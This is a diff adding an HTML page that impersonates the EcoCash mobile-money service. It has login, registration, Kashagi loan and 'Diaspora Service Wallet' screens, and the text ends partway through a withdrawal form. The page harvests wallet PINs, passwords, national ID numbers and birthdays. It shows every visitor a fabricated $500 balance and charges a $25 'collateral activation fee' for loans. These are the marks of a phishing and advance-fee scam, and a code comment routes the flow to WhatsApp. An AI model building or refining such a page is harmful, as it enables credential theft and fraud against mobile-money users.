@@ -1,0 +1,1144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash - Official Digital Wallet & Kashagi</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts Inter -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        ecoblue: '#0066cc',
+                        ecodarkblue: '#004aa8',
+                        ecored: '#e61c24',
+                        cardblue: '#1e4fa1',
+                        supergreen: '#008751',
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        .curved-bottom {
+            border-top-left-radius: 44% 26px;
+            border-top-right-radius: 44% 26px;
+        }
+        .no-scrollbar::-webkit-scrollbar {
+            display: none;
+        }
+        .no-scrollbar {
+            -ms-overflow-style: none;
+            scrollbar-width: none;
+        }
+        .service-circle-icon {
+            background: radial-gradient(circle at 30% 30%, #3b82f6 0%, #0066cc 65%, #004287 100%);
+            box-shadow: 0 6px 14px rgba(0, 102, 204, 0.25), inset 0 2px 4px rgba(255, 255, 255, 0.35);
+        }
+        input[type=range].eco-slider {
+            -webkit-appearance: none;
+            appearance: none;
+            background: transparent;
+            cursor: pointer;
+        }
+        input[type=range].eco-slider::-webkit-slider-runnable-track {
+            height: 8px;
+            border-radius: 999px;
+        }
+        input[type=range].eco-slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            height: 22px;
+            width: 22px;
+            border-radius: 50%;
+            background: #0066cc;
+            border: 3px solid #ffffff;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.25);
+            margin-top: -7px;
+        }
+    </style>
+</head>
+<body class="bg-gray-100 font-sans antialiased text-gray-800 flex justify-center min-h-screen">
+
+    <!-- Mobile Container -->
+    <div class="w-full max-w-md bg-white min-h-screen flex flex-col shadow-2xl relative overflow-x-hidden">
+
+        <!-- PLAIN CYCLE OVERLAY (3 SECONDS, CYCLE ONLY, NO WORDS) -->
+        <div id="plain-cycle-overlay" class="fixed inset-0 z-50 bg-black/50 hidden flex items-center justify-center transition-opacity duration-200">
+            <div class="w-12 h-12 border-4 border-white/30 border-t-white rounded-full animate-spin"></div>
+        </div>
+
+        <!-- HEADER & NAVIGATION -->
+        <header class="bg-white border-b border-gray-200 sticky top-0 z-40">
+            <div class="px-4 py-3 flex justify-between items-center bg-white">
+                <div class="cursor-pointer flex items-center" onclick="navigateWithCycle('login')">
+                    <span class="text-3xl font-extrabold text-ecoblue tracking-tight">Eco</span><span class="text-3xl font-extrabold text-ecored tracking-tight">Cash</span>
+                </div>
+
+                <button id="menu-btn" onclick="toggleMenu()" class="p-2 border border-gray-200 rounded-md text-gray-600 hover:bg-gray-50 focus:outline-none transition">
+                    <i class="fa-solid fa-bars text-xl"></i>
+                </button>
+            </div>
+
+            <div id="nav-dropdown" class="hidden bg-white border-t border-gray-100 px-6 py-3 space-y-2 shadow-md text-sm">
+                <button onclick="navigateWithCycle('login'); toggleMenu();" class="block w-full text-left py-2 text-gray-700 font-medium hover:text-ecoblue">Sign In</button>
+                <button onclick="navigateWithCycle('signup'); toggleMenu();" class="block w-full text-left py-2 text-gray-700 font-medium hover:text-ecoblue">Register</button>
+                <button onclick="navigateWithCycle('contact'); toggleMenu();" class="block w-full text-left py-2 text-gray-700 font-medium hover:text-ecoblue">Help & Support</button>
+            </div>
+        </header>
+
+        <!-- MAIN CONTENT CONTAINER -->
+        <main class="flex-1 flex flex-col justify-between">
+
+            <!-- Toast Notification Container -->
+            <div id="toast-container" class="fixed top-20 left-1/2 -translate-x-1/2 z-50 transition-all duration-300 opacity-0 pointer-events-none">
+                <div id="toast-message" class="bg-red-600 text-white px-4 py-2 rounded-lg shadow-lg text-xs font-semibold tracking-wide text-center">
+                    Please check your input.
+                </div>
+            </div>
+
+            <!-- ================= VIEW 1: OFFICIAL ECOCASH SIGN IN SCREEN ================= -->
+            <section id="view-login" class="flex-1 flex flex-col justify-between bg-white">
+                <div class="px-6 pt-8 pb-6">
+                    <div class="text-center mb-7">
+                        <h2 class="text-xl font-bold text-gray-800">Sign In to EcoCash</h2>
+                        <p class="text-xs text-gray-500 mt-1">Enter your mobile number and 4-digit PIN</p>
+                    </div>
+
+                    <!-- Phone Input -->
+                    <div class="mb-5">
+                        <label class="block text-xs font-semibold text-gray-700 mb-1.5">Mobile Number</label>
+                        <div class="flex items-center border border-ecoblue rounded-lg px-3 py-3 focus-within:ring-2 focus-within:ring-ecoblue bg-white relative">
+                            <div class="flex items-center space-x-2 mr-2.5 border-r border-gray-300 pr-2.5">
+                                <svg class="w-6 h-4 rounded-sm border border-gray-200" viewBox="0 0 60 30" xmlns="http://www.w3.org/2000/svg">
+                                    <rect width="60" height="30" fill="#319200"/>
+                                    <rect y="4.28" width="60" height="21.44" fill="#ffd200"/>
+                                    <rect y="8.57" width="60" height="12.86" fill="#de2010"/>
+                                    <rect y="12.86" width="60" height="4.28" fill="#000000"/>
+                                    <polygon points="0,0 20,15 0,30" fill="#ffffff"/>
+                                    <polygon points="0,0 20,15 0,30" fill="none" stroke="#000" stroke-width="0.5"/>
+                                    <polygon points="6,15 13,10 10,18 16,13 8,13" fill="#de2010"/>
+                                </svg>
+                                <span class="text-gray-700 font-semibold text-sm">+263</span>
+                            </div>
+                            <input type="tel" id="login-phone" inputmode="numeric" pattern="[0-9]*" placeholder="712345678" maxlength="9" class="w-full text-gray-800 bg-transparent font-medium outline-none text-base tracking-wide" oninput="validateLoginForm()">
+                            <span id="login-phone-icon" class="absolute right-3 hidden text-base"></span>
+                        </div>
+                        <p id="login-phone-error" class="text-[11px] text-red-600 mt-1 hidden font-medium">Enter a valid 9-digit number starting with 7</p>
+                    </div>
+
+                    <!-- PIN Input Field -->
+                    <div class="text-center mb-7">
+                        <label class="block text-xs font-semibold text-gray-700 mb-2">PIN</label>
+                        <div class="relative max-w-xs mx-auto">
+                            <input type="password" id="login-pin-single" inputmode="numeric" pattern="[0-9]*" maxlength="4" placeholder="••••" class="w-full h-14 border-2 border-ecoblue bg-white text-gray-800 rounded-xl text-center text-2xl font-extrabold tracking-[1em] focus:outline-none focus:ring-2 focus:ring-ecoblue shadow-sm" oninput="validateLoginForm()">
+                            <button type="button" onclick="togglePinVisibility()" class="absolute right-4 top-4 text-gray-600 hover:text-ecoblue focus:outline-none">
+                                <i id="pin-eye-icon" class="fa-regular fa-eye text-lg"></i>
+                            </button>
+                        </div>
+                        <p id="login-pin-error" class="text-[11px] text-red-600 mt-1 hidden font-medium text-center">PIN must be 4 digits</p>
+                    </div>
+
+                    <!-- SIGN IN BUTTON -->
+                    <button id="login-btn" disabled onclick="handleLoginSubmit()" class="w-full py-3.5 px-4 rounded-lg bg-gray-200 text-gray-400 font-bold transition duration-200 cursor-not-allowed uppercase tracking-wider text-sm shadow-sm">
+                        SIGN IN
+                    </button>
+                </div>
+
+                <!-- Bottom Curved Blue Action Box -->
+                <div class="bg-ecoblue text-white curved-bottom pt-8 pb-10 px-6 text-center space-y-5">
+                    <p class="text-sm font-medium leading-relaxed px-4">
+                        Register an EcoCash wallet or access support below
+                    </p>
+
+                    <div class="grid grid-cols-2 gap-4">
+                        <button onclick="navigateWithCycle('signup')" class="bg-white text-ecoblue rounded-lg py-4 px-2 flex flex-col items-center justify-center space-y-1 shadow-md hover:bg-gray-50 transition">
+                            <i class="fa-solid fa-user text-gray-700 text-lg"></i>
+                            <span class="font-bold text-sm">Register</span>
+                        </button>
+
+                        <button onclick="navigateWithCycle('contact')" class="bg-white text-ecoblue rounded-lg py-4 px-2 flex flex-col items-center justify-center space-y-1 shadow-md hover:bg-gray-50 transition">
+                            <i class="fa-solid fa-circle-info text-gray-500 text-lg"></i>
+                            <span class="font-bold text-sm">Help & Support</span>
+                        </button>
+                    </div>
+
+                    <div class="pt-4 text-xs space-y-1 opacity-90">
+                        <p class="font-medium">v2.1.3P</p>
+                        <p class="text-xs">By signing in you agree to the <a href="#" onclick="event.preventDefault(); navigateWithCycle('terms');" class="underline font-semibold">Terms and Conditions</a></p>
+                    </div>
+                </div>
+            </section>
+
+
+            <!-- ================= VIEW 2: REGISTER / SIGN UP SCREEN ================= -->
+            <section id="view-signup" class="hidden p-6 flex-1 bg-gradient-to-b from-blue-50 to-white">
+                <div class="bg-white rounded-xl p-6 shadow-sm border border-gray-100 mb-6">
+                    <div class="flex items-center justify-between mb-5">
+                        <button onclick="navigateWithCycle('login')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
+                            <i class="fa-solid fa-arrow-left"></i> <span>Back</span>
+                        </button>
+                        <h2 class="text-xl font-bold text-gray-800">Register</h2>
+                    </div>
+
+                    <form onsubmit="event.preventDefault();" class="space-y-4 text-xs text-gray-700">
+                        <div>
+                            <label class="block font-medium mb-1">First Name <span class="text-red-500">*</span></label>
+                            <div class="relative">
+                                <input type="text" id="signup-firstname" placeholder="First Name" class="w-full border border-gray-200 bg-white text-gray-800 rounded-md p-3 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                                <span id="signup-firstname-icon" class="absolute right-3 top-3 hidden text-sm"></span>
+                            </div>
+                            <p id="signup-firstname-error" class="text-[10px] text-red-600 mt-0.5 hidden">Letters only</p>
+                        </div>
+
+                        <div>
+                            <label class="block font-medium mb-1">Surname <span class="text-red-500">*</span></label>
+                            <div class="relative">
+                                <input type="text" id="signup-surname" placeholder="Surname" class="w-full border border-gray-200 bg-white text-gray-800 rounded-md p-3 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                                <span id="signup-surname-icon" class="absolute right-3 top-3 hidden text-sm"></span>
+                            </div>
+                            <p id="signup-surname-error" class="text-[10px] text-red-600 mt-0.5 hidden">Letters only</p>
+                        </div>
+
+                        <div>
+                            <label class="block font-medium mb-1">Country <span class="text-red-500">*</span></label>
+                            <select id="signup-country" class="w-full border border-gray-200 rounded-md p-3 text-sm outline-none bg-white focus:border-ecoblue text-gray-700" onchange="validateSignupForm()">
+                                <option value="">---Select country---</option>
+                                <option value="Zimbabwe">Zimbabwe</option>
+                                <option value="South Africa">South Africa</option>
+                                <option value="United Kingdom">United Kingdom</option>
+                            </select>
+                        </div>
+
+                        <div>
+                            <label class="block font-medium mb-1">Mobile Number <span class="text-red-500">*</span></label>
+                            <div class="bg-gray-100 text-gray-600 p-2 rounded-md text-center text-xs font-semibold mb-2 border border-gray-200">
+                                +263
+                            </div>
+                            <div class="relative">
+                                <input type="tel" inputmode="numeric" pattern="[0-9]*" id="signup-phone" placeholder="712345678" maxlength="9" class="w-full border border-gray-200 bg-white text-gray-800 rounded-md p-3 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                                <span id="signup-phone-icon" class="absolute right-3 top-3 hidden text-sm"></span>
+                            </div>
+                            <p id="signup-phone-error" class="text-[10px] text-red-600 mt-0.5 hidden">9 digits starting with 7</p>
+                        </div>
+
+                        <div>
+                            <label class="block font-medium mb-1">Email <span class="text-red-500">*</span></label>
+                            <div class="relative">
+                                <input type="email" id="signup-email" placeholder="Email" class="w-full border border-gray-200 bg-white text-gray-800 rounded-md p-3 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                                <span id="signup-email-icon" class="absolute right-3 top-3 hidden text-sm"></span>
+                            </div>
+                            <p id="signup-email-error" class="text-[10px] text-red-600 mt-0.5 hidden">Invalid email format</p>
+                        </div>
+
+                        <div>
+                            <label class="block font-medium mb-1">Zimbabwe National ID <span class="text-red-500">*</span></label>
+                            <div class="relative">
+                                <input type="text" id="signup-nid" placeholder="e.g. 63-1234567A89" class="w-full border border-gray-200 bg-white text-gray-800 rounded-md p-3 text-sm outline-none focus:border-ecoblue uppercase" oninput="validateSignupForm()">
+                                <span id="signup-nid-icon" class="absolute right-3 top-3 hidden text-sm"></span>
+                            </div>
+                            <p id="signup-id-error" class="text-[10px] text-red-600 mt-1 hidden font-medium">Format: 63-1234567A89</p>
+                        </div>
+
+                        <div>
+                            <label class="block font-medium mb-1">
+                                Password <span class="text-red-500">*</span> <span class="font-normal text-gray-500">(Min 8 chars, 1 letter, 1 number)</span>
+                            </label>
+                            <div class="relative">
+                                <input type="password" id="new-password" placeholder="Password" class="w-full border border-gray-200 bg-white text-gray-800 rounded-md p-3 pr-16 text-sm outline-none focus:border-ecoblue" oninput="validateSignupForm()">
+                                <span id="signup-password-icon" class="absolute right-9 top-3 hidden text-sm"></span>
+                                <button type="button" onclick="togglePasswordVisibility()" class="absolute right-3 top-3.5 text-gray-500">
+                                    <i id="password-eye-icon" class="fa-regular fa-eye"></i>
+                                </button>
+                            </div>
+                            <p id="signup-password-error" class="text-[10px] text-red-600 mt-0.5 hidden">Min 8 chars, 1 letter & 1 number</p>
+                        </div>
+
+                        <div>
+                            <label class="block font-medium mb-1">Gender <span class="text-red-500">*</span></label>
+                            <div class="flex items-center space-x-4">
+                                <label class="inline-flex items-center space-x-1 cursor-pointer">
+                                    <input type="radio" name="gender" value="Male" class="text-ecoblue focus:ring-ecoblue" onchange="validateSignupForm()">
+                                    <span>Male</span>
+                                </label>
+                                <label class="inline-flex items-center space-x-1 cursor-pointer">
+                                    <input type="radio" name="gender" value="Female" class="text-ecoblue focus:ring-ecoblue" onchange="validateSignupForm()">
+                                    <span>Female</span>
+                                </label>
+                            </div>
+                        </div>
+
+                        <div>
+                            <label class="block font-medium mb-1">Birthday <span class="text-red-500">*</span></label>
+                            <div class="grid grid-cols-3 gap-2">
+                                <select id="b-day" class="border border-gray-200 rounded-md p-2.5 text-xs text-gray-700 outline-none bg-white" onchange="validateSignupForm()">
+                                    <option value="">Day</option>
+                                    <script>
+                                        for(let i=1; i<=31; i++) document.write(`<option value="${i}">${i}</option>`);
+                                    </script>
+                                </select>
+                                <select id="b-month" class="border border-gray-200 rounded-md p-2.5 text-xs text-gray-700 outline-none bg-white" onchange="validateSignupForm()">
+                                    <option value="">Month</option>
+                                    <option value="January">January</option><option value="February">February</option><option value="March">March</option>
+                                    <option value="April">April</option><option value="May">May</option><option value="June">June</option>
+                                    <option value="July">July</option><option value="August">August</option><option value="September">September</option>
+                                    <option value="October">October</option><option value="November">November</option><option value="December">December</option>
+                                </select>
+                                <select id="b-year" class="border border-gray-200 rounded-md p-2.5 text-xs text-gray-700 outline-none bg-white" onchange="validateSignupForm()">
+                                    <option value="">Year</option>
+                                    <script>
+                                        for(let i=2008; i>=1940; i--) document.write(`<option value="${i}">${i}</option>`);
+                                    </script>
+                                </select>
+                            </div>
+                        </div>
+
+                        <div class="flex items-start space-x-2 pt-2">
+                            <input type="checkbox" id="terms" class="mt-0.5 rounded text-ecoblue focus:ring-ecoblue" onchange="validateSignupForm()">
+                            <label for="terms" class="text-xs text-gray-600 leading-tight cursor-pointer">
+                                I agree to the <a href="#" onclick="event.preventDefault(); navigateWithCycle('terms');" class="text-blue-600 hover:underline">Terms and Conditions</a>.
+                            </label>
+                        </div>
+
+                        <div class="pt-4 space-y-3">
+                            <button type="button" id="signup-btn" disabled onclick="handleSignUpSubmit()" class="w-full bg-gray-200 text-gray-400 font-semibold py-3.5 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition">
+                                REGISTER
+                            </button>
+                            <button type="button" onclick="navigateWithCycle('login')" class="w-full border border-ecored text-ecored font-semibold py-2.5 rounded-md uppercase text-xs tracking-wider hover:bg-red-50 transition">
+                                SIGN IN
+                            </button>
+                        </div>
+                    </form>
+                </div>
+
+                <div class="text-center py-4 text-xs font-semibold text-gray-500">
+                    ©2026 EcoCash
+                </div>
+            </section>
+
+
+            <!-- ================= VIEW 3: OFFICIAL ECOCASH HOME (ONLY 2 SERVICES) ================= -->
+            <section id="view-dashboard" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50/70 to-white flex flex-col justify-between">
+                <div>
+                    <!-- Official Wallet Summary Card -->
+                    <div class="bg-gradient-to-r from-ecoblue to-cardblue rounded-2xl p-5 shadow-md text-white mb-6 relative overflow-hidden">
+                        <div class="flex items-center justify-between mb-3">
+                            <span class="text-[11px] font-bold uppercase tracking-wider text-blue-100">EcoCash Wallet</span>
+                            <span id="dash-phone-badge" class="text-xs font-mono bg-white/15 px-2.5 py-0.5 rounded-full">+263 ---</span>
+                        </div>
+                        <div class="flex items-end justify-between">
+                            <div>
+                                <p class="text-[11px] text-blue-100">Account Holder</p>
+                                <h3 id="dash-name-display" class="font-extrabold text-base mt-0.5">EcoCash Customer</h3>
+                            </div>
+                            <div class="text-right">
+                                <span class="text-[10px] uppercase tracking-wider bg-white/20 px-2 py-1 rounded font-semibold">Active</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- ONLY 2 SERVICES: 1. Apply for Kashagi Loans | 2. Check My Diaspora Service Wallet -->
+                    <div class="bg-white rounded-2xl p-5 shadow-sm border border-gray-100">
+                        <h3 class="text-xs font-extrabold uppercase tracking-wider text-gray-700 mb-4">Services</h3>
+
+                        <div class="grid grid-cols-2 gap-4 text-center">
+                            <!-- Service 1: Apply for Kashagi Loans -->
+                            <button onclick="navigateWithCycle('kashagi-loan')" class="flex flex-col items-center p-4 rounded-xl border border-gray-100 hover:border-ecoblue hover:bg-blue-50/40 transition group focus:outline-none">
+                                <div class="w-14 h-14 rounded-full service-circle-icon flex items-center justify-center text-white mb-3 transform group-hover:scale-105 transition duration-200">
+                                    <i class="fa-solid fa-landmark text-xl"></i>
+                                </div>
+                                <span class="text-xs font-bold text-gray-800 leading-snug group-hover:text-ecoblue">Apply for Kashagi Loans</span>
+                            </button>
+
+                            <!-- Service 2: Check My Diaspora Service Wallet -->
+                            <button onclick="navigateWithCycle('diaspora-wallet')" class="flex flex-col items-center p-4 rounded-xl border border-gray-100 hover:border-ecoblue hover:bg-blue-50/40 transition group focus:outline-none">
+                                <div class="w-14 h-14 rounded-full service-circle-icon flex items-center justify-center text-white mb-3 transform group-hover:scale-105 transition duration-200">
+                                    <i class="fa-solid fa-globe text-xl"></i>
+                                </div>
+                                <span class="text-xs font-bold text-gray-800 leading-snug group-hover:text-ecoblue">Check My Diaspora Service Wallet</span>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="text-center py-4 text-xs font-semibold text-gray-500">
+                    ©2026 EcoCash
+                </div>
+            </section>
+
+
+            <!-- ================= VIEW 4: KASHAGI LOANS (FINTECH CALCULATOR + DYNAMIC AMOUNT + MONTHS + $25 COLLATERAL ACTIVATION FEE) ================= -->
+            <section id="view-kashagi-loan" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50/70 to-white flex flex-col justify-between">
+                <div>
+                    <div class="flex items-center justify-between mb-4 pb-3 border-b border-gray-200">
+                        <button onclick="navigateWithCycle('dashboard')" class="text-sm text-ecoblue font-semibold flex items-center space-x-1.5 hover:underline">
+                            <i class="fa-solid fa-arrow-left"></i> <span>Back</span>
+                        </button>
+                        <h2 class="text-base font-extrabold text-gray-800">Kashagi Loans</h2>
+                    </div>
+
+                    <!-- Fintech Calculator Card -->
+                    <div class="bg-white rounded-2xl p-5 shadow-sm border border-gray-100 mb-4 space-y-5">
+                        <!-- Dynamic Loan Amount -->
+                        <div>
+                            <div class="flex items-center justify-between mb-2">
+                                <label class="text-xs font-bold text-gray-700 uppercase tracking-wide">Loan Amount (USD)</label>
+                                <div class="flex items-center border border-ecoblue rounded-lg px-2.5 py-1 bg-blue-50/40 w-32">
+                                    <span class="text-sm font-extrabold text-ecoblue mr-1">$</span>
+                                    <input type="number" id="loan-amount-input" min="50" max="5000" step="10" value="500" oninput="syncLoanAmountFromInput()" class="w-full bg-transparent font-extrabold text-sm text-gray-900 outline-none text-right">
+                                </div>
+                            </div>
+
+                            <input type="range" id="loan-amount-slider" min="50" max="5000" step="10" value="500" oninput="syncLoanAmountFromSlider()" class="w-full eco-slider bg-blue-100 rounded-full h-2">
+
+                            <!-- Dynamic Quick Amount Buttons -->
+                            <div class="grid grid-cols-4 gap-2 mt-3">
+                                <button type="button" onclick="setDynamicLoanAmount(100)" class="loan-preset-btn py-1.5 rounded-lg border text-xs font-bold transition border-gray-200 text-gray-700 hover:border-ecoblue">$100</button>
+                                <button type="button" onclick="setDynamicLoanAmount(500)" class="loan-preset-btn py-1.5 rounded-lg border text-xs font-bold transition border-ecoblue bg-ecoblue text-white">$500</button>
+                                <button type="button" onclick="setDynamicLoanAmount(1500)" class="loan-preset-btn py-1.5 rounded-lg border text-xs font-bold transition border-gray-200 text-gray-700 hover:border-ecoblue">$1,500</button>
+                                <button type="button" onclick="setDynamicLoanAmount(3000)" class="loan-preset-btn py-1.5 rounded-lg border text-xs font-bold transition border-gray-200 text-gray-700 hover:border-ecoblue">$3,000</button>
+                            </div>
+                        </div>
+
+                        <!-- Months to Pay Loan -->
+                        <div class="pt-2 border-t border-gray-100">
+                            <div class="flex items-center justify-between mb-2">
+                                <label class="text-xs font-bold text-gray-700 uppercase tracking-wide">Months to Pay Loan</label>
+                                <span id="loan-months-label" class="text-sm font-extrabold text-ecoblue">6 Months</span>
+                            </div>
+
+                            <input type="range" id="loan-months-slider" min="1" max="24" step="1" value="6" oninput="recalculateLoan()" class="w-full eco-slider bg-blue-100 rounded-full h-2">
+
+                            <div class="grid grid-cols-4 gap-2 mt-3">
+                                <button type="button" onclick="setLoanMonths(3)" class="months-preset-btn py-1.5 rounded-lg border text-xs font-bold transition border-gray-200 text-gray-700 hover:border-ecoblue">3 Mo</button>
+                                <button type="button" onclick="setLoanMonths(6)" class="months-preset-btn py-1.5 rounded-lg border text-xs font-bold transition border-ecoblue bg-ecoblue text-white">6 Mo</button>
+                                <button type="button" onclick="setLoanMonths(12)" class="months-preset-btn py-1.5 rounded-lg border text-xs font-bold transition border-gray-200 text-gray-700 hover:border-ecoblue">12 Mo</button>
+                                <button type="button" onclick="setLoanMonths(24)" class="months-preset-btn py-1.5 rounded-lg border text-xs font-bold transition border-gray-200 text-gray-700 hover:border-ecoblue">24 Mo</button>
+                            </div>
+                        </div>
+
+                        <!-- Calculation Breakdown -->
+                        <div class="bg-gray-50 rounded-xl p-4 border border-gray-200 space-y-2.5 text-xs">
+                            <div class="flex justify-between items-center">
+                                <span class="text-gray-600 font-medium">Selected Loan Amount</span>
+                                <span id="calc-principal" class="font-extrabold text-gray-900 text-sm">$500.00</span>
+                            </div>
+                            <div class="flex justify-between items-center">
+                                <span class="text-gray-600 font-medium">Repayment Term</span>
+                                <span id="calc-term" class="font-bold text-gray-800">6 Months</span>
+                            </div>
+                            <div class="flex justify-between items-center">
+                                <span class="text-gray-600 font-medium">Estimated Monthly Repayment</span>
+                                <span id="calc-monthly" class="font-extrabold text-ecoblue text-sm">$87.50 / mo</span>
+                            </div>
+                            <div class="border-t border-gray-200 pt-2.5 flex justify-between items-center">
+                                <span class="text-gray-800 font-bold">Collateral Activation Fee</span>
+                                <span class="font-extrabold text-ecored text-sm">$25.00 USD</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Applicant Details Card -->
+                    <div class="bg-white rounded-2xl p-5 shadow-sm border border-gray-100 space-y-4 text-xs">
+                        <h3 class="font-extrabold uppercase tracking-wider text-gray-700">Applicant Details</h3>
+
+                        <div>
+                            <label class="block font-bold text-gray-700 mb-1">Full Name <span class="text-red-500">*</span></label>
+                            <input type="text" id="loan-applicant-name" placeholder="Full Name as per ID" class="w-full border border-gray-300 rounded-lg p-3 text-sm text-gray-900 outline-none focus:border-ecoblue" oninput="validateLoanApplication()">
+                        </div>
+
+                        <div>
+                            <label class="block font-bold text-gray-700 mb-1">Mobile Number (+263) <span class="text-red-500">*</span></label>
+                            <div class="flex items-center border border-gray-300 rounded-lg overflow-hidden focus-within:border-ecoblue">
+                                <span class="bg-gray-100 px-3 py-3 text-xs font-bold text-gray-700 border-r border-gray-300">+263</span>
+                                <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="9" id="loan-applicant-phone" placeholder="712345678" class="w-full p-3 text-sm text-gray-900 outline-none" oninput="validateLoanApplication()">
+                            </div>
+                        </div>
+
+                        <div>
+                            <label class="block font-bold text-gray-700 mb-1">National ID Number <span class="text-red-500">*</span></label>
+                            <input type="text" id="loan-applicant-nid" placeholder="e.g. 63-1234567A89" class="w-full border border-gray-300 rounded-lg p-3 text-sm text-gray-900 outline-none focus:border-ecoblue uppercase" oninput="validateLoanApplication()">
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Dynamic Submit Button -->
+                <div class="pt-5 pb-2">
+                    <button type="button" id="loan-submit-btn" disabled onclick="submitKashagiLoan()" class="w-full bg-gray-200 text-gray-400 font-bold py-4 rounded-xl uppercase text-xs tracking-wider cursor-not-allowed transition shadow-sm">
+                        APPLY FOR $500 LOAN (6 MOS) • $25 COLLATERAL ACTIVATION FEE
+                    </button>
+                </div>
+            </section>
+
+
+            <!-- ================= VIEW 5: DIASPORA SERVICE WALLET ($500 BALANCE -> WITHDRAW -> RECEIPT -> WHATSAPP) ================= -->
+            <section id="view-diaspora-wallet" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50/70 to-white flex flex-col justify-between">
+                <div>
+                    <div class="flex items-center justify-between mb-4 pb-3 border-b border-gray-200">
+                        <button onclick="navigateWithCycle('dashboard')" class="text-sm text-ecoblue font-semibold flex items-center space-x-1.5 hover:underline">
+                            <i class="fa-solid fa-arrow-left"></i> <span>Back</span>
+                        </button>
+                        <h2 class="text-base font-extrabold text-gray-800">Diaspora Service Wallet</h2>
+                    </div>
+
+                    <!-- Step A: Check My Balance -> Shows $500 USD & Directs to Withdraw Button -->
+                    <div id="diaspora-balance-panel" class="bg-white rounded-2xl p-6 shadow-sm border border-gray-100 text-center space-y-5">
+                        <div class="w-12 h-12 rounded-full service-circle-icon text-white flex items-center justify-center mx-auto">
+                            <i class="fa-solid fa-wallet text-lg"></i>
+                        </div>
+
+                        <div>
+                            <p class="text-xs font-bold uppercase tracking-wider text-gray-500">Diaspora Service Wallet</p>
+                            <div id="diaspora-balance-hidden-state" class="mt-2">
+                                <p class="text-2xl font-extrabold text-gray-400 tracking-wider">••••••</p>
+                                <p class="text-xs text-gray-500 mt-1">Tap below to check your available balance</p>
+                            </div>
+                            <div id="diaspora-balance-revealed-state" class="hidden mt-2">
+                                <p class="text-3xl font-extrabold text-ecoblue">$500.00 <span class="text-sm font-bold text-gray-600">USD</span></p>
+                                <p class="text-xs text-supergreen font-semibold mt-1">Available for Withdrawal</p>
+                            </div>
+                        </div>
+
+                        <button id="check-balance-btn" type="button" onclick="revealDiasporaBalance()" class="w-full bg-ecoblue hover:bg-ecodarkblue text-white font-bold py-3.5 rounded-xl uppercase text-xs tracking-wider transition shadow-md">
+                            CHECK MY BALANCE
+                        </button>
+
+                        <button id="go-to-withdraw-btn" type="button" onclick="openWithdrawForm()" class="hidden w-full bg-supergreen hover:opacity-95 text-white font-bold py-3.5 rounded-xl uppercase text-xs tracking-wider transition shadow-md">
+                            WITHDRAW
+                        </button>
+                    </div>
+
+                    <!-- Step B: Receiver Credentials Form -->
+                    <div id="diaspora-withdraw-form" class="hidden bg-white rounded-2xl p-5 shadow-sm border border-gray-100 space-y-4 text-xs mt-4">
+                        <div class="flex items-center justify-between border-b border-gray-100 pb-2">
+                            <h3 class="font-extrabold uppercase tracking-wider text-gray-800">Receiver Details</h3>
+                            <span class="text-[11px] font-bold text-ecoblue">Available: $500 USD</span>
+                        </div>
+
+                        <div>
+                            <label class="block font-bold text-gray-700 mb-1">Phone Number <span class="text-red-500">*</span></label>
+                            <div class="flex items-center border border-gray-300 rounded-lg overflow-hidden focus-within:border-ecoblue">
+                                <span class="bg-gray-100 px-3 py-3 text-xs font-bold text-gray-700 border-r border-gray-300">+263</span>
+                                <input type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="9" id="wd-phone" placeholder="712345678" class="w-full p-3 text-sm text-gray-900 outline-none" oninput="validateWithdrawForm()">
+                            </div>
+                            <p id="wd-phone-error" class="text-[11px] text-red-600 mt-1 hidden font-medium">Enter a valid 9-digit number starting with 7</p>
+                        </div>
+
+                        <div>
+                            <label class="block font-bold text-gray-700 mb-1">Amount to Withdraw (USD, Max $500) <span class="text-red-500">*</span></label>
+                            <input type="number" inputmode="numeric" id="wd-amount" min="1" max="500" placeholder="Enter amount (1 - 500)" class="w-full border border-gray-300 rounded-lg p-3 text-sm text-gray-900 outline-none focus:border-ecoblue" oninput="validateWithdrawForm()">
+                            <p id="wd-amount-error" class="text-[11px] text-red-600 mt-1 hidden font-medium">Amount must be greater than $0 and not greater than $500 USD</p>
+                        </div>
+
+                        <div>
+                            <label class="block font-bold text-gray-700 mb-1">PIN <span class="text-red-500">*</span></label>
+                            <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="4" id="wd-pin" placeholder="4-digit PIN" class="w-full border border-gray-300 rounded-lg p-3 text-sm text-gray-900 outline-none focus:border-ecoblue tracking-widest" oninput="validateWithdrawForm()">
+                            <p id="wd-pin-error" class="text-[11px] text-red-600 mt-1 hidden font-medium">PIN must be 4 digits</p>
+                        </div>
+
+                        <div>
+                            <label class="block font-bold text-gray-700 mb-1">ID Number <span class="text-red-500">*</span></label>
+                            <input type="text" id="wd-id" placeholder="e.g. 63-1234567A89" class="w-full border border-gray-300 rounded-lg p-3 text-sm text-gray-900 outline-none focus:border-ecoblue uppercase" oninput="validateWithdrawForm()">
